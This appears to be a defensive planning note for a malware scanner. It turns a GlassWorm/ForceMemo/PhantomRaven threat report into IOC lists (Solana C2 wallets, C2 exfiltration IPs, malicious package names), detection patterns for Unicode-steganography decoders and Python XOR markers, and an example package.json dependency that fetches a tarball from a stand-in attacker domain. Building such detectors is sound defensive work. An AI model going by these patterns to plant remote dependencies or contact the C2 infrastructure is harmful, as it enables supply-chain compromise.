# INTEL2.md Analysis - Actionable Items

**Date:** 2026-03-19  
**Source:** GlassWorm Comprehensive Threat Intelligence Report  

---

## ✅ Already Implemented/Detected

| Intel Item | Our Status |
|------------|------------|
| Variation Selector detection (0xFE00-0xFE0F, 0xE0100-0xE01EF) | ✅ Implemented |
| Decoder pattern detection (`codePointAt` + hex constants) | ✅ Implemented |
| Solana wallet C2 detection | ✅ Partially (need to add specific wallets) |
| Google Calendar C2 URL | ✅ Detected (pattern-based) |
| Known malicious packages (@iflow-mcp, @aifabrix) | ✅ Already scanning |

---

## 🎯 NEW Actionable Intelligence

### 1. Additional Solana Wallets to Add

```rust
const KNOWN_C2_WALLETS: &[&str] = &[
    // Already have:
    "BjVeAjPrSKFiingBn4vZvghsGj9KCE8AJVtbc9S8o8SC",  // GlassWorm
    
    // NEW from INTEL2:
    "28PKnu7RzizxBzFPoLp69HLXp9bJL3JFtT2s5QzHsEA2",  // Primary GlassWorm
    "G2YxRa6wt1qePMwfJzdXZG62ej4qaTC7YURzuh2Lwd3t",  // ForceMemo funding
];
```

### 2. New C2 IPs to Monitor

```rust
const KNOWN_C2_IPS: &[&str] = &[
    // Already have:
    "217.69.3.218",
    "199.247.10.166",
    "45.32.150.251",
    
    // NEW from INTEL2:
    "140.82.52.31",   // GlassWorm exfil
    "199.247.13.106", // GlassWorm exfil
    "45.32.151.157",  // ForceMemo
    "45.32.150.97",   // ForceMemo
    "217.69.11.57",   // ForceMemo
    "217.69.11.99",   // ForceMemo
    "217.69.0.159",   // ForceMemo (current)
    "45.76.44.240",   // ForceMemo (current)
];
```

### 3. PhantomRaven RDD Detection

**New pattern:** URL-based dependencies in package.json

```json
{
  "dependencies": {
    "ui-styles-pkg": "https://attacker-domain.com/package.tgz"
  }
}
```

**Detection:** Add detector for `https://` URLs in package.json dependencies

### 4. ForceMemo Python Markers

```python
# Search for these in Python files:
lzcdrtfxyqiplpd  # Primary marker variable
idzextbcjbgkdih = 134  # XOR key constant
```

### 5. New Malicious Packages to Scan

| Package | Versions | Priority |
|---------|----------|----------|
| `ui-styles-pkg` | All | 🔴 High (PhantomRaven) |
| `js-pkg` | All | 🔴 High |
| `ts-pkg` | All | 🔴 High |
| `angular-studio.ng-angular-extension` | All | 🟡 Medium (OpenVSX) |
| `gvotcha.claude-code-extension` | All | 🟡 Medium |
| `cline-ai-main.cline-ai-agent` | 3.1.3 | 🔴 High (VSCode Marketplace) |

### 6. PhantomRaven Package Patterns

**Naming patterns to sample:**
- `babel-plugin-transform-*`
- `eslint-plugin-*`
- `sort-export-*`
- `filter-imports-*`

---

## ❓ Questions for Expert Agent

### 1. Additional Wallet Addresses

**Question:** "Are there additional Solana wallet addresses used in GlassWorm/ForceMemo campaigns beyond the three documented (28PKnu..., BjVeAj..., G2YxRa...)? Specifically:
- Wallets used in PhantomRaven campaign
- Wallets used in PyPI parallel campaign (mentioned but truncated)
- Any newly discovered wallets post-March 2026"

### 2. PyPI Campaign Details

**Question:** "The report mentions 'PyPI Parallel Campaign' but the text is truncated. Please provide:
- Malicious PyPI package names
- Attack patterns used (Unicode steganography in Python?)
- C2 infrastructure for PyPI campaign
- Detection signatures for Python files"

### 3. Cursor IDE Extensions

**Question:** "The report predicts Cursor IDE targeting. Is there evidence this has already occurred?
- Known malicious Cursor extensions?
- Attack patterns specific to Cursor architecture?
- Detection signatures for Cursor extension manifests?"

### 4. CI/CD Pipeline Injection

**Question:** "The report predicts CI/CD targeting. Is there evidence of:
- Compromised GitHub Actions?
- Malicious GitHub Actions in marketplace?
- Detection signatures for workflow files (.github/workflows/*.yml)?"

### 5. Nested Dependency Attacks

**Question:** "Are there known instances of:
- Transitive dependency compromise (package A → B → malicious C)?
- Specific packages used as intermediaries?
- Detection approach for nested RDD attacks?"

### 6. Historical Backdoor Timeline

**Question:** "The report mentions 'Wave 0' (Aug-Oct 2025 reconnaissance). Can you provide:
- Specific packages/repos compromised in Wave 0?
- Attack patterns used in Wave 0?
- Any IOCs from this period?"

### 7. Additional C2 Domains

**Question:** "Beyond the documented domains, are there:
- Newly registered domains matching the 'artifact' pattern?
- Alternative TLDs used (.net, .org, .io)?
- Domain generation algorithm (DGA) patterns?"

### 8. Mobile Developer Targeting

**Question:** "The report predicts mobile dev targeting. Is there evidence of:
- Malicious Xcode extensions?
- Malicious Android Studio plugins?
- Compromised CocoaPods or Gradle plugins?"

### 9. GitLab/Bitbucket Compromises

**Question:** "Are there documented cases of:
- GlassWorm/ForceMemo on GitLab repositories?
- GlassWorm/ForceMemo on Bitbucket repositories?
- Platform-specific attack patterns?"

### 10. Complete Malicious Extension List

**Question:** "The report lists 20+ malicious Open VSX extensions and 1 VSCode Marketplace extension. Is there a complete list including:
- Extensions not yet publicly disclosed?
- Extensions removed before disclosure?
- Extensions on JetBrains Marketplace?"

---

## Recommended Actions

### Immediate (Today)

1. ✅ **Add new Solana wallets** to blockchain_c2_detector
2. ✅ **Add new C2 IPs** to detector (if we add IP detection)
3. ✅ **Scan PhantomRaven packages** (ui-styles-pkg, js-pkg, ts-pkg)
4. ✅ **Scan new malicious extensions** (cline-ai-main, etc.)

### Short-term (This Week)

1. **Add RDD detector** - Detect URL-based dependencies in package.json
2. **Add ForceMemo Python detector** - Search for lzcdrtfxyqiplpd marker
3. **Expand sampling** - Add babel-plugin, eslint-plugin patterns
4. **Request expert answers** - Send questions above

### Long-term (Next Week)

1. **Add CI/CD detector** - Scan .github/workflows/*.yml
2. **Add Cursor extension support** - If intel confirms targeting
3. **Add PyPI scanning** - If intel provides Python signatures
4. **Add nested dependency analysis** - Transitive dependency scanning

---

**Status:** Ready to implement immediate actions, awaiting expert responses for long-term planning
